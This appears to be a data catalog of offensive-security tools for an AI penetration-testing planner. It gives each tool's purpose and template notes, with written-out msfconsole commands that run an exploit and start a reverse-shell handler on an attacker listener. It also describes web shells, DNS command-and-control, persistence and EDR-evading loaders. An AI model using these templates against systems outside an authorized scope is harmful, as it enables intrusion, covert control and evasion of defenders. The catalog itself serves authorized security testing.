note: Curated catalog of the standard offensive toolbox. DATA ONLY — this file executes nothing. Every invocation here is a TEMPLATE the planner draws on so proposed commands are well-formed and consistent; each one still goes through the same gated executor (approve-each, heuristic red-confirm, target/scope lock, argv-only). Templates are written from each tool's own documentation and standard usage. Placeholders use <angle-brackets>; <target> is filled by the composer's substitute_target so a rendered command points at the real engagement target and nothing else.

placeholders.<target>: Host, IP or URL under test — filled from the engagement target.
placeholders.<hashfile>: Path to a file of captured hashes.
placeholders.<binary>: Path to a local binary under analysis.
placeholders.<size>: A response size in bytes, used to filter baseline/404 noise.
placeholders.<technique>: A technique/tag name the tool understands (e.g. a nuclei tag).
placeholders.<database>: Database name on the target DBMS.
placeholders.<pattern>: A literal string or regex to search for.
placeholders.<listener>: The ATTACKER-side callback address. Deliberately not named <lhost>/<ip>: those spell a keyword the composer's target substitution rewrites, and the callback host is yours, not the target's.
placeholders.<ntlm-hash>: An NTLM hash for pass-the-hash, LM:NT or bare NT.
placeholders.<keyfile>: Path to a private key file.
placeholders.<query>: A search term for a module/exploit/index lookup.
placeholders.<api-key>: API key for a third-party service.
placeholders.<spn-user>: A SECOND account name, distinct from <user> — the account being acted ON when <user> is the account acting.
placeholders.<subs-file>: Path to a file of subdomains/hostnames, one per line.
placeholders.<urls-file>: Path to a file of URLs, one per line.
placeholders.<js-file>: Path to a JavaScript file, or a file listing JS URLs.
placeholders.<resolvers>: Path to a trusted DNS resolvers list (e.g. /usr/share/resolvers.txt).
placeholders.<asn>: An autonomous system number, e.g. AS15169.
placeholders.<cidr>: An IP range in CIDR notation, e.g. 10.0.0.0/24.
placeholders.<keyword>: A base keyword/company name to derive cloud asset names from.
placeholders.<token-file>: Path to a file of API tokens, one per line.
placeholders.<dorks-file>: Path to a file of dork queries, one per line.
placeholders.<payload>: A payload: a msfvenom/metasploit payload name or path, or the command, script or implant to run when a persistence mechanism fires.
placeholders.<name>: A name/identifier for the object being created (task, service, registry value, unit, shortcut).
placeholders.<tunnel-zone>: A DNS zone the OPERATOR controls and has delegated to their own name server — the suffix a DNS tunnel encodes its traffic under. Deliberately not named <domain>: that spelling the composer's target substitution rewrites, and the tunnel's zone is yours, not the target's (same reason as <listener>).
placeholders.<tunnel-net>: The point-to-point address (optionally with a netmask) the OPERATOR assigns to a tunnel interface, e.g. an unused private /27. Not spelled with ip/host for the same reason as <listener>: the tunnel's own network is never the target's.

templates.note: Feed it the URL list katana/gau produced.

templates.label: Rate-limited run against a fragile target
templates.note: --stable slows down and re-checks; -d is a delay in seconds between requests.

tools.name: paramspider
tools.purpose: Mines web archives for URLs that carry parameters, giving a parameterised attack surface for a domain without sending the target a single request.

templates.label: Mine archived parameterised URLs
templates.note: Passive — it queries archives, not the target.

templates.label: Drop static assets from the results
templates.note: Static files dominate archive data; excluding them leaves the real endpoints.

templates.label: Placeholder-marked output for fuzzing
templates.note: Values replaced with FUZZ so the list drops straight into ffuf or wfuzz.

flags.what: placeholder to substitute for parameter values

tools.name: katana
tools.purpose: Fast crawler with an optional headless browser, so it sees the endpoints a JavaScript-rendered application only exposes at runtime.

templates.label: Crawl a target
templates.note: -jc parses linked JavaScript for endpoints the HTML never references.

templates.label: Headless crawl for a JS-heavy app
templates.note: Slower but finds routes that only exist after the bundle executes.

templates.label: Crawl a host list, staying in scope
templates.note: -fs fqdn keeps the crawl on the same host instead of wandering off-scope.

templates.label: Passive sources only (no requests to the target)
templates.note: Pulls from archives/indexes — useful before you are cleared to touch the host.

tools.name: gau
tools.purpose: Pulls every URL known to Wayback, Common Crawl, OTX and URLScan for a domain — historical endpoints that are often still live and rarely still maintained.

templates.label: All known URLs for a domain
templates.note: Entirely passive — no traffic reaches the target.

templates.label: Include subdomains, recent results only
templates.note: --from trims a decade of dead paths down to plausibly-live ones.

templates.label: Keep only parameterised URLs
templates.note: The subset worth fuzzing — everything else is static.

tools.name: waybackurls
tools.purpose: Fetches every path the Wayback Machine ever recorded for a domain. Narrower than gau, and the standard first passive sweep for forgotten endpoints and old parameters.

templates.label: Archived URLs for a domain
templates.note: Passive. Reads stdin too, so it chains after subfinder.

templates.label: Parameterised URLs only
templates.note: Feeds arjun, ffuf or a manual review of the parameter surface.

templates.label: Interesting file types
templates.note: Archived backups and configs are a recurring source of leaked secrets.

flags.what: prefix each URL with its capture date
list every archived version of a URL

tools.name: dirsearch
tools.purpose: Content discovery with sensible defaults — extension expansion, status filtering and recursion built in, so it needs less tuning than a raw fuzzer for a first pass.

templates.label: Discovery with extension expansion
templates.note: -e appends each extension to every word; -x drops uninteresting statuses.

templates.label: Custom wordlist, tuned concurrency
templates.note: Drop -t well below 50 on anything rate-limited or fragile.

templates.label: Recursive into discovered directories
templates.note: Cap the depth — unbounded recursion turns into a denial of service.

templates.label: Hunt backup and config leftovers
templates.note: Editor and deploy leftovers next to a known file are a common source of source-code disclosure.

tools.name: wafw00f
tools.purpose: Fingerprints which WAF sits in front of an application. Informational, and worth running early: it explains 403s that would otherwise read as 'not vulnerable'.

templates.label: Fingerprint the WAF
templates.note: Sends a small number of benign probes and matches the responses.

templates.label: Test every known signature
templates.note: -a keeps going after the first match — some stacks run two WAFs.

templates.label: Check a list of hosts
templates.note: Tells you which hosts in scope are actually defended.

flags.what: find all matches, not just the first
list the WAFs it can detect

tools.name: testssl.sh
tools.purpose: Thorough TLS assessment — protocols, ciphers, certificate chain and the named TLS vulnerabilities — from a single script with no dependencies to install.

templates.label: Full assessment
templates.note: Accepts host, host:port or a URL. Non-invasive — it negotiates handshakes only.

templates.label: Known TLS vulnerabilities only
templates.note: -U runs the vulnerability battery; --sneaky uses a less obvious user agent.

templates.label: Protocols and ciphers by strength
templates.note: The pair that answers 'is anything weak still enabled'.

templates.label: Machine-readable output
templates.note: JSON for diffing across retests or feeding into a report.

tools.name: jwt_tool
tools.purpose: JWT analysis and attack toolkit — decodes a token, then tests the signature-handling flaws (alg confusion, alg:none, weak HMAC secrets, kid injection) that turn a token into an authentication bypass.

templates.label: Decode and inspect a token
templates.note: Always the first step — the header's alg and kid decide which attacks apply.

templates.label: Run the full attack playbook against a live endpoint
templates.note: -M at runs all tests and reports which the server accepted.

templates.label: Crack a weak HMAC secret
templates.note: Entirely offline. A cracked secret means you can mint arbitrary tokens.

templates.label: Forge with alg:none
templates.note: -X a strips the signature; -X k is key confusion, -X i is kid injection.

flags.what: crack the secret with a dictionary
exploit: a=alg:none, k=key confusion, i=kid injection

tools.name: wfuzz
tools.purpose: General-purpose HTTP fuzzer built around response filtering — its strength is subtractive: baseline the noise, hide it, and whatever remains is the anomaly.

templates.label: Directory fuzz
templates.note: FUZZ marks the injection point; --hc hides a status code.

templates.label: Parameter value fuzz with a baseline filter
templates.note: --hh hides the common response length so only the different one shows.

templates.label: Virtual host discovery
templates.note: Finds name-based vhosts the default site never links to.

templates.label: Authenticated fuzzing with a rate limit
templates.note: -b sends a cookie; -s adds a delay between requests.

flags.what: hide by code / lines / words / chars

tools.name: hakrawler
tools.purpose: Minimal, fast crawler for endpoints, JS files and subdomains — deliberately unix-y, so it slots into a pipeline between host discovery and parameter mining.

templates.label: Crawl a URL
templates.note: Reads targets on stdin; -u deduplicates.

templates.label: Deeper crawl including subdomains
templates.note: -subs follows links onto sibling subdomains — check scope before using it.

templates.label: With an authenticated session
templates.note: Authenticated crawls usually reveal several times more surface.

tools.name: sslscan
tools.purpose: Quick cipher and protocol enumeration for a TLS service — narrower and much faster than testssl.sh, which makes it the right tool when sweeping many hosts.

templates.label: Enumerate ciphers and protocols
templates.note: Colour-codes weak ciphers. Add :port for a non-443 service.

templates.label: Certificate detail only
templates.note: Certificate SANs frequently name internal hosts worth adding to scope.

templates.label: STARTTLS on a mail service
templates.note: Also --starttls-imap, --starttls-pop3, --starttls-ftp.

tools.name: rustscan
tools.purpose: Very fast port sweep that hands its findings straight to nmap for service detection — the practical answer to 'nmap -p- takes too long'.

templates.label: Full sweep, then nmap on what it found
templates.note: Everything after -- is passed to nmap, against only the open ports.

templates.label: Specific port range
templates.note: Use when a full sweep is too loud or too slow for the window.

templates.label: Gentler batch size for a fragile host
templates.note: The default rate can knock over embedded or heavily-filtered targets.

flags.what: raise the file-descriptor limit (needed for speed)

tools.name: naabu
tools.purpose: SYN/CONNECT port scanner built for pipelines — fast, quiet by default and designed to feed httpx or nuclei directly.

templates.label: Top ports on a host
templates.note: SYN scan needs root; it falls back to CONNECT without it.

templates.label: Full sweep piped into httpx
templates.note: Ports straight to live-HTTP detection in one pass.

templates.label: Scan a host list with a rate cap
templates.note: -rate is the packets/sec ceiling — the knob for staying under IDS thresholds.

templates.label: Hand off to nmap for service detection
templates.note: Same two-phase pattern as rustscan.

flags.what: scan the N most common ports
nmap command to run on the results

tools.name: dnsrecon
tools.purpose: Broad DNS enumeration — standard records, subdomain brute force, reverse lookups, cache snooping and zone transfers in one tool.

templates.label: Standard record enumeration
templates.note: SOA, NS, MX, A, TXT and SRV — the free information before anything noisy.

templates.label: Attempt a zone transfer
templates.note: Rarely works, and hands over the entire zone when it does. Always worth one try.

templates.label: Brute-force subdomains
templates.note: Catches names that no certificate log or archive ever recorded.

templates.label: SRV records — locate AD services
templates.note: In an AD environment this names the domain controllers directly.

flags.what: type: std, axfr, brt, srv, rvl, snoop

tools.name: shodan
tools.purpose: Queries Shodan's existing internet-wide scan index. Entirely passive — it reports what Shodan already saw, so the target receives no traffic from you at all.

templates.label: One-time API key setup
templates.note: Stored locally; needed once before any other subcommand.

templates.label: What Shodan already knows about a host
templates.note: Open ports, banners and history without sending the target a packet.

templates.label: Search the index
templates.note: Query syntax supports org:, ssl:, http.title:, product: filters.

templates.label: All indexed hosts under a domain
templates.note: Subdomains plus the ports Shodan last saw open on each.

tools.name: fierce
tools.purpose: DNS reconnaissance that also walks the address ranges around what it finds — good at locating the non-contiguous netblocks an organisation actually uses.

templates.label: Enumerate a domain
templates.note: Tries a zone transfer first, then brute-forces, then scans nearby addresses.

templates.label: With a custom subdomain wordlist
templates.note: The default list is small — a targeted one finds considerably more.

templates.label: Widen the adjacent-address sweep
templates.note: Checks N addresses either side of each hit for related hosts.

flags.what: how far to walk around each found address

tools.name: msfconsole
tools.purpose: The Metasploit console — a large library of exploit, auxiliary and post modules with a common interface for configuring, checking and running them.

templates.label: Search for a module
templates.note: -q quiet, -x runs commands non-interactively. Search by CVE, product or name.

templates.label: Check exploitability WITHOUT exploiting
templates.note: Many modules support check — confirm before firing anything.

templates.label: Run a module against the target
templates.template: msfconsole -q -x 'use <module>; set RHOSTS <target>; set LPORT <listener-port>; run; exit'
templates.note: Read the module's options and description first; some are destructive.

templates.label: Handler for an incoming callback
templates.template: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <listener>; set LPORT <listener-port>; run'
templates.note: LHOST is YOUR address, not the target's — it is where the shell connects back to.

tools.name: msfvenom
tools.purpose: Metasploit's standalone payload generator — builds a shell or agent for a given platform and output format, with optional encoding and bad-character avoidance.

templates.label: Windows reverse TCP executable
templates.note: LHOST is your callback address. Pair with a multi/handler before delivering it.

templates.label: Linux ELF reverse shell
templates.note: Staged (meterpreter) vs stageless (shell_reverse_tcp) matters when egress is filtered.

templates.label: Web payload for an upload or deploy path
templates.note: Also php/meterpreter/reverse_tcp -f raw, or windows/.../reverse_tcp -f aspx.

templates.label: Raw shellcode avoiding bad characters
templates.note: -b excludes bytes the vulnerable parser would truncate on.

templates.label: List available payloads
templates.note: Purely informational — generates nothing.

flags.what: output format (exe, elf, raw, war, aspx, c, py)

tools.name: searchsploit
tools.purpose: Offline search over the Exploit-DB archive — maps a product and version from your service enumeration to public exploit code already on disk.

templates.label: Search by product and version
templates.note: Fully offline. Keep the terms short — over-specific version strings miss.

templates.label: Show the path to an exploit
templates.note: Prints the full local path and copies it to the clipboard where available.

templates.label: Copy an exploit into the working directory
templates.note: Mirror, then READ the source before running it — many need editing, some are hostile.

templates.label: Match an nmap scan against the archive
templates.note: Takes the XML from nmap -oX / -oA and looks up every detected service.

flags.what: search from an nmap XML file

tools.name: linpeas
tools.purpose: Linux privilege-escalation enumeration script — runs hundreds of local checks and colour-codes what it finds by how likely it is to be exploitable.

templates.label: Full enumeration, output kept
templates.note: -a is the thorough pass. Red-on-yellow findings are the ones worth reading first.

templates.label: Targeted sections only
templates.note: Much quicker and far less noise when you already know what you are looking for.

templates.label: Quiet mode without colour
templates.note: Plain text for a report or for grepping offline.

tools.name: winpeas
tools.purpose: The Windows counterpart to linpeas — enumerates services, registry, credentials, tokens and installed software, highlighting the misconfigurations that lead to SYSTEM.

templates.label: Full enumeration to a log file
templates.note: Very loud on an EDR-monitored host — expect it to be detected.

templates.label: Targeted modules only
templates.note: Faster and much quieter than the full sweep.

templates.label: Search for stored credentials
templates.note: Saved credentials in files and the registry are the most common quick win.

tools.name: trufflehog
tools.purpose: Hunt for verified leaked secrets — API keys, tokens, credentials — across git history, filesystems and CI, with live verification to cut false positives.

templates.label: Scan a git repo (verified only)
templates.note: --only-verified drops unproven matches; start here to avoid noise.

templates.label: Scan a GitHub org
templates.note: Needs a token in env (GITHUB_TOKEN) for private/rate-limited reads.

templates.label: Scan a local filesystem path
templates.note: Point at a cloned repo or a loot directory.

flags.what: scan every repo in a GitHub org

tools.name: msftrecon
tools.purpose: Unauthenticated Microsoft 365 / Entra ID (Azure AD) tenant recon — tenant ID, federation, domains and enabled services — from just a domain name.

templates.label: Enumerate a tenant from a domain
templates.note: Needs internet egress; maps a domain to its Entra tenant and services.

tools.name: github-subdomains
tools.purpose: Mine subdomains for a target from GitHub code search — a passive source that public DNS and CT logs miss.

templates.label: Subdomains from GitHub code search
templates.note: Needs one or more GitHub tokens (-t file); results are best-effort by rate limit.

tools.name: gitlab-subdomains
tools.purpose: Mine subdomains for a target from GitLab code search — the GitLab counterpart to github-subdomains.

templates.label: Subdomains from GitLab code search
templates.note: Needs a GitLab token; complements the GitHub source.

tools.name: dorks_hunter
tools.purpose: Run a curated set of Google dorks against a domain to surface exposed files, panels, logs and info leaks in one pass.

templates.label: Dork a domain
templates.note: Needs internet egress; results depend on search availability/rate limits.

tools.name: gitdorks_go
tools.purpose: Search GitHub with a dork list for secrets and sensitive references tied to a target — automated GitHub dorking.

templates.label: GitHub dork a target
templates.note: Needs GitHub token(s); -gd points at a dork list, -nws caps concurrency.

tools.name: gotator
tools.purpose: Generate DNS permutation candidates from known subdomains + a words list — the rule-based half of permutation enumeration.

templates.label: Permute known subdomains
templates.note: Feed the output into puredns to resolve; candidates are unresolved by design.

flags.what: use the words also as data (mix-in)

tools.name: regulator
tools.purpose: Derive high-yield permutation rules from the subdomains you already found (learns the target's naming pattern) instead of a generic word list.

templates.label: Learn rules + emit candidates
templates.note: Output is a candidate list — resolve it with puredns.

tools.name: subwiz
tools.purpose: ML-based subdomain prediction: from the subdomains already found, a trained model proposes likely new ones — smarter than brute force, cheaper than a huge wordlist.

templates.label: Predict new subdomains
templates.note: Fetches its model at runtime, so it runs in the engagement/:kali sandboxes (which have egress) but NOT the airgapped lab; gotator/regulator cover permutations offline.

tools.name: puredns
tools.purpose: Resolve massive host lists fast and filter DNS wildcards accurately — the resolution backbone that turns permutation/brute candidates into real subdomains.

templates.label: Resolve a candidate list
templates.note: Wildcard-filters as it resolves; pair with gotator/regulator output.

templates.label: Bruteforce subdomains
templates.note: Uses massdns under the hood; resolver validation needs egress.

tools.name: massdns
tools.purpose: Very high-throughput stub DNS resolver — the engine puredns drives, usable directly for bulk A/CNAME resolution.

templates.label: Bulk-resolve a host list
templates.note: -o S is simple text output; feed a wildcard-aware step afterwards.

tools.name: dnsvalidator
tools.purpose: Build a list of DNS resolvers that actually return correct answers — the trusted-resolver input puredns/massdns depend on for clean results.

templates.label: Generate a validated resolver list
templates.note: Needs egress to validate; the baked /usr/share/resolvers.txt is the offline fallback in the lab.

tools.name: asnmap
tools.purpose: Map an organisation or domain to its ASNs and the CIDR ranges they own — the first move for expanding scope on a wide target.

templates.label: CIDRs owned by a domain
templates.note: Only act on ranges inside the authorised scope — this widens what you can see, not what you may touch.

templates.label: CIDRs for an ASN
templates.note: PDCP_API_KEY improves coverage but is optional.

tools.name: mapcidr
tools.purpose: Expand, aggregate and slice CIDR ranges into host lists (and back) — the plumbing between ASN discovery and host-level scanning.

templates.label: Expand a CIDR to hosts
templates.note: Pipe into a resolver/scanner; keep ranges scope-checked.

tools.name: tlsx
tools.purpose: Grab TLS certificate data (SANs, CN, issuer) at scale — a fast way to pull extra hostnames straight off the certificates a target serves.

templates.label: Pull SAN/CN names from hosts
templates.note: SAN entries often reveal sibling hostnames; feed them back into resolution.

tools.name: csprecon
tools.purpose: Extract hostnames from a target's Content-Security-Policy headers — a passive subdomain source hiding in plain sight in HTTP responses.

templates.label: Hosts from CSP headers
templates.note: -d keeps results scoped to the target apex.

tools.name: gf
tools.purpose: Grep a URL list through curated pattern packs to triage vuln candidates (XSS/SSRF/SQLi/redirect/…) — turns a raw URL dump into a prioritised worklist.

templates.label: Pull XSS candidate URLs
templates.note: Relies on the gf-patterns baked into the image at ~/.gf; the pattern name selects the bug class.

templates.label: Pull candidates for a bug class
templates.note: e.g. ssrf, sqli, redirect, lfi, rce — feed the hits into qsreplace + a targeted scanner.

tools.name: qsreplace
tools.purpose: Rewrite every query-string value in a URL list with a chosen value/payload — the glue that turns harvested URLs into a fuzzable payload set.

templates.label: Inject a payload into all params
templates.note: Pipe the result into a scanner (dalfox, nuclei -dast) — qsreplace itself only rewrites text.

tools.name: unfurl
tools.purpose: Break URLs into their parts (domains, paths, keys, params) for sorting and dedup — a small but constant step in any URL-processing pipeline.

templates.label: Extract unique param keys
templates.note: Also: domains, paths, apexes, format — cheap building blocks.

tools.name: jsluice
tools.purpose: Parse JavaScript to extract endpoints, URLs and secrets that crawling alone misses — reads the JS instead of just listing it.

templates.label: Extract endpoints from JS
templates.note: Finds fetch/XHR/route strings the DOM never renders.

templates.label: Extract secrets from JS
templates.note: Flags API keys/tokens embedded in bundles.

tools.name: subjs
tools.purpose: Discover the JavaScript files a set of pages loads — the fetch step that feeds jsluice/getjs.

templates.label: List JS URLs from pages
templates.note: Pipe the JS URLs into getjs (fetch) then jsluice (parse).

tools.name: getjs
tools.purpose: Fetch JavaScript files (including from a URL list) for offline analysis — the retrieval half of JS mining.

templates.label: Fetch JS from a URL list
templates.note: --complete resolves relative script src to absolute URLs.

tools.name: commix
tools.purpose: Detect and exploit OS command-injection in web parameters automatically.

templates.label: Test a parameter
templates.note: This exploits, not just tests — it correctly trips the executor's danger confirm.

tools.name: SSTImap
tools.purpose: Detect and exploit server-side template injection across many engines, with sandbox-escape payloads.

templates.label: Test a parameter for SSTI
templates.note: The * marks the injection point; escalates to RCE where the engine allows — danger-confirmed.

flags.what: run an OS command if exploitable

tools.name: nomore403
tools.purpose: Attempt a battery of 403/401 access-control bypasses (header, path, method and case tricks) against a forbidden URL.

templates.label: Bypass a forbidden path
templates.note: Complements the bypass-403 methodology; treat successes as leads to verify by hand.

tools.name: crlfuzz
tools.purpose: Fuzz for CRLF injection (header/response splitting) across a URL list at speed.

templates.label: Scan a single URL
templates.note: Pairs with the cmd-injection (commix) and SSTI (SSTImap) tools to round out the injection set.

templates.label: Scan a URL list
templates.note: Feed gf/qsreplace output straight in.

tools.name: s3scanner
tools.purpose: Enumerate open/misconfigured object-storage buckets (S3 and compatible) and dump their permissions — external cloud recon, distinct from the posture scanners.

templates.label: Scan a named bucket
templates.note: Reports open/closed + which permissions are world-readable/writable.

templates.label: Scan a bucket list
templates.note: Derive candidate names from the target keyword first.

tools.name: cloud_enum
tools.purpose: Enumerate public cloud assets across AWS, Azure and GCP (buckets, blobs, functions, apps) from a base keyword — multi-cloud external asset discovery.

templates.label: Enumerate assets for a keyword
templates.note: Needs egress; repeat -k for name variants (company, product, abbreviations).

flags.what: keyword to mutate into asset names

tools.name: SharPersist
tools.purpose: Windows persistence toolkit (Mandiant) — add or remove one persistence mechanism at a time from inside a session: scheduled tasks, registry autorun, startup folder and services, with add/remove and list modes so an operator can also clean up.

templates.label: Scheduled-task persistence (logon)
templates.note: Adds a logon-triggered task. `-m remove` reverses it; `-m check`/`-m list` enumerate what is present.

templates.label: Registry Run-key persistence

templates.label: Startup-folder persistence
templates.note: Drops a shortcut into the user's Startup folder.

tools.name: Sliver
tools.purpose: Cross-platform adversary-emulation C2 framework (Bishop Fox): mTLS, HTTP(S), DNS and WireGuard listeners with per-OS implants, plus post-exploitation and persistence modules. Human-driven in HackPit — starting a listener and every implant action is its own approved step through the gated executor. Its sandbox-image install and the cockpit Sliver panel land in later tasks of this build; until they do, reconcile shows it not-present and the planner will not propose it.

templates.label: Start an mTLS listener (Sliver console)
templates.note: Operator-side listener, on your own host. Starting and stopping it is a human-driven, gated action — nothing in the catalog starts a listener.

templates.label: Generate an mTLS implant (Sliver console)
templates.note: Run inside the Sliver console. Produces an artifact on disk; delivering or running it is a separate, separately-approved step.

templates.label: Generate a DNS implant (Sliver console)
templates.note: Beacons over a DNS zone YOU control and have delegated — never the target's. Much louder in DNS telemetry than mTLS; see the detection footprint for what a defender sees.

tools.name: Empire
tools.purpose: PowerShell/Python post-exploitation framework with a catalogue of persistence modules. Reference-only in HackPit: NOT installed — catalogued so the planner can name it, but no install or C2 wiring is provided, so reconcile shows it not-present and the planner will not propose it.

templates.label: Select a persistence module (Empire client)
templates.note: Run inside the Empire client. Reference-only — Empire is not installed; run it from your own host.

tools.name: weevely
tools.purpose: Obfuscated PHP web-shell generator and client (T1505.003) — generates a stealthy PHP backdoor and drives it over an encrypted channel. Reference-only in HackPit: NOT installed.

templates.label: Generate an obfuscated PHP web shell
templates.note: Produces the backdoor file you then drop into the web root.

templates.label: Connect to a planted web shell
templates.note: Opens the managed session against an already-deployed shell.

tools.name: dnscat2
tools.purpose: Encrypted command-and-control tunnelled entirely over DNS (T1071.004). The client talks only to the host's configured resolver, so it reaches the operator's authoritative server through the target's own DNS infrastructure without opening a direct outbound socket — which is what makes it the test of whether egress filtering and DNS analytics catch a covert channel. Its sandbox-image install lands in a later task of this build.

templates.label: Start the server (operator side)
templates.note: Runs on the authoritative name server for a zone YOU control and have had delegated — never the target's zone. Listener lifecycle is human-driven through the gated executor.

templates.label: Connect a client from the compromised host
templates.note: Runs on a host you already have execution on, as its own approved step. Add `--dns server=<listener>` only to test direct-to-server mode instead of recursion through the target's resolver.

flags.what: resolver/transport settings, e.g. server=, port=, domain=
pre-shared key authenticating the encrypted session

tools.name: iodine
tools.purpose: IP-over-DNS tunnel (T1572): brings up a point-to-point interface whose packets ride inside DNS queries, so ordinary tooling can be routed through a network that permits nothing but DNS. Slower and far louder in DNS telemetry than a purpose-built C2 — catalogued to prove out egress controls, not to stay quiet. Its sandbox-image install lands in a later task of this build.

templates.label: Start the server (operator side)
templates.note: Runs on the name server for a delegated zone YOU control. <tunnel-net> is the tunnel interface's own address/netmask and is unrelated to any engagement range.

templates.label: Connect a client from the compromised host
templates.note: Runs on the host you already have execution on. `-r` forces DNS-only mode when the faster raw-UDP path would succeed and it is the DNS path you want tested.

flags.what: client: skip the raw-UDP probe, force DNS-only

tools.name: donut
tools.purpose: Converts a PE, .NET assembly, DLL or VBS/JS file into position-independent shellcode a loader can run from memory (T1620), so the payload never has to land on disk as an executable. Generation only: the output is a file until a human approves a separate step that runs it. Its sandbox-image install lands in a later task of this build.

templates.label: PE / .NET assembly to shellcode
templates.note: Emits position-independent shellcode. Feeding it to a loader is its own approved step — donut itself only writes a file.

templates.label: Shellcode for a specific architecture
templates.note: -a 1 = x86, 2 = amd64, 3 = dual-mode. Match the host you will run on.

flags.what: input PE / .NET assembly / DLL / VBS / JS
parameters passed to the entry point

tools.name: ScareCrow
tools.purpose: Loader generator that wraps shellcode in a Windows artifact and restores clean copies of ntdll/kernel32 before running it, so userland API hooking sees nothing (T1620 / T1027.002). Cross-compiles from Linux. HackPit only GENERATES the artifact; delivering or running it is a separate, separately-approved step. Its sandbox-image install lands in a later task of this build.

templates.label: Loader from raw shellcode
templates.note: -I takes raw shellcode (donut output, for instance). -Loader picks the artifact type: binary, dll, cpl, xll, msiexec, control, js, hta, wscript. The result is a file on disk, nothing more.

flags.what: artifact type: binary, dll, cpl, xll, msiexec, ...
domain whose code-signing identity the artifact spoofs

tools.name: Invoke-Obfuscation
tools.purpose: PowerShell obfuscation framework (T1027.010) — token, string, encoding and launcher-level rewrites of a script or command, used to test whether script-block logging, AMSI and signature-based detection still fire once a payload is transformed. Windows/PowerShell host only: it cannot run on the Linux sandbox, and is catalogued so HackPit can help PLAN and WRITE UP that work rather than implying it is runnable here.

templates.label: Obfuscate a script non-interactively
templates.note: Runs on a Windows PowerShell host — deliberately NOT installed in the Linux image. -Command replays the interactive menu path; Token\All\1 applies every token-level transform.

flags.what: the .ps1 to obfuscate (-ScriptBlock for inline code)
suppress the banner and menu output
stay in the console after the command runs
